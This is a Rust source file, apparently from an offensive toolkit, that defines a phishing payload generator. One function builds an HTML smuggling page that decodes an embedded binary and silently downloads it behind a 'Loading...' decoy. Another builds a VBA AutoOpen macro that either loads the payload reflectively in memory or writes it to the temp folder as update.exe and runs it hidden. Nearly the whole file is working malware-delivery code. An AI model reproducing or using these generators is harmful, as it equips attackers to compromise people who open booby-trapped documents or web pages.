use base64::{Engine as _, engine::general_purpose};

pub struct PhishingGenerator;

impl PhishingGenerator {
    pub fn generate_html_smuggling(payload: &[u8], filename: &str) -> String {
        let b64 = general_purpose::STANDARD.encode(payload);
        // Basic HTML Smuggling template
        format!(
            r###"<!DOCTYPE html>
<html>
<head><title>Document</title></head>
<body>
<p>Loading...</p>
<script>
    function base64ToArrayBuffer(base64) {{
        var binary_string = window.atob(base64);
        var len = binary_string.length;
        var bytes = new Uint8Array(len);
        for (var i = 0; i < len; i++) {{
            bytes[i] = binary_string.charCodeAt(i);
        }}
        return bytes.buffer;
    }}
    
    var file = "{}";
    var data = base64ToArrayBuffer("{}");
    var blob = new Blob([data], {{type: "application/octet-stream"}});
    var fileName = file;
    
    if (window.navigator.msSaveOrOpenBlob) {{
        window.navigator.msSaveOrOpenBlob(blob, fileName);
    }} else {{
        var a = document.createElement("a");
        document.body.appendChild(a);
        a.style = "display: none";
        var url = window.URL.createObjectURL(blob);
        a.href = url;
        a.download = fileName;
        a.click();
        window.URL.revokeObjectURL(url);
    }}
</script>
</body>
</html>"###,
            filename, b64
        )
    }

    pub fn generate_macro_vba(payload: &[u8], method: &str) -> String {
        let b64 = general_purpose::STANDARD.encode(payload);
        let mut chunks = String::new();
        
        for chunk in b64.as_bytes().chunks(80) {
            let s = std::str::from_utf8(chunk).unwrap();
            chunks.push_str(&format!("    payload = payload & \"{}\"\n", s));
        }

        if method == "memory" {
            // Memory Execution (Reflective PE Loader)
            let loader = crate::builder::vba_pe_loader::VBA_PE_LOADER_TEMPLATE;
            format!(
                r#"
Sub AutoOpen()
    Dim payload As String
    payload = ""
{}
    
    Dim bytes() As Byte
    bytes = DecodeBase64(payload)
    
    ' Execute in memory
    PELoader bytes
End Sub

{}

Function DecodeBase64(ByVal strData As String) As Byte()
    Dim objXML As Object
    Dim objNode As Object
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue
    Set objNode = Nothing
    Set objXML = Nothing
End Function
"#,
                chunks, loader
            )
        } else {
            // Drop and Execute (Default)
            format!(
                r#"
Sub AutoOpen()
    Dim payload As String
    payload = ""
{}
    
    Dim bytes() As Byte
    bytes = DecodeBase64(payload)
    
    Dim path As String
    path = Environ("TEMP") & "\update.exe"
    
    On Error Resume Next
    Kill path
    On Error GoTo 0
    
    Dim fileNum As Integer
    fileNum = FreeFile
    Open path For Binary As #fileNum
    Put #fileNum, , bytes
    Close #fileNum
    
    Shell path, vbHide
End Sub

Function DecodeBase64(ByVal strData As String) As Byte()
    Dim objXML As Object
    Dim objNode As Object
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue
    Set objNode = Nothing
    Set objXML = Nothing
End Function
"#,
                chunks
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_html_smuggling_generation() {
        let payload = b"test payload";
        let html = PhishingGenerator::generate_html_smuggling(payload, "test.exe");
        assert!(html.contains("test.exe"));
        // Base64 of "test payload" is "dGVzdCBwYXlsb2Fk"
        assert!(html.contains("dGVzdCBwYXlsb2Fk"));
    }

    #[test]
    fn test_macro_vba_generation() {
        let payload = b"\x90\x90";
        let vba = PhishingGenerator::generate_macro_vba(payload, "drop");
        assert!(vba.contains("DecodeBase64"));
        assert!(vba.contains("Environ(\"TEMP\")"));
        // Base64 of 0x9090 is kJA=
        assert!(vba.contains("kJA="));
    }
}
